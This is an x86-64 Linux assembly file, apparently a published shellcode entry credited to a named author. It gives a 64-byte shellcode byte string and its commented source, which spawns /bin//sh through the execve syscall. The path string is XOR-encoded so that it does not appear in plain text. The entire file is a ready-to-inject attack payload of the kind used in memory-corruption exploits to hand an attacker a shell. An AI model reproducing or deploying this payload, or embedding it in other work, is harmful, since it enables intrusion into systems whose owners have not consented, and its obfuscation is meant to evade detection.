; Author: Robert Catalin Raducioiu
; Shellcode: "\x31\xc9\x48\xf7\xe1\x48\x89\x54\x24\xf8\x48\x83\xec\x08\x54\x5a\x48\xbe\x5b\x01\x0b\x1c\x5b\x4c\x11\x1a\x48\xbb\x74\x63\x62\x72\x74\x63\x62\x72\x48\x31\xde\x56\x54\x5f\x51\x48\x89\x7c\x24\xf8\x48\x83\xec\x08\x48\x8d\x34\x24\x83\xc0\x3c\x48\xff\xc8\x0f\x05";
; Shellcode length: 64 bytes

global _start

section .text

_start:

    ; clear RAX register (zero-sign extended)
    xor ecx, ecx
    mul rcx

    ; NULL terminator for the string below
    mov [rsp - 8], rdx
    sub rsp, 8

    ; 3rd argument of execve: envp (in this case a pointer to NULL)
    push rsp
    pop rdx

    ; string "/bin//sh"
    ; mov rbx, 0x68732f2f6e69622f
    mov rsi, 0x1a114c5b1c0b015b
    mov rbx, 0x7262637472626374
    xor rsi, rbx
    push rsi

    ; 1st argument of execve: executable to run
    push rsp
    pop rdi

    ; 2nd argument of execve: array of arguments passed to the executable
    push rcx

    mov [rsp - 8], rdi
    sub rsp, 8

    lea rsi, [rsp]

    ; syscall execve
    add eax, 0x3c
    dec rax

    ; invoke execve
    syscall
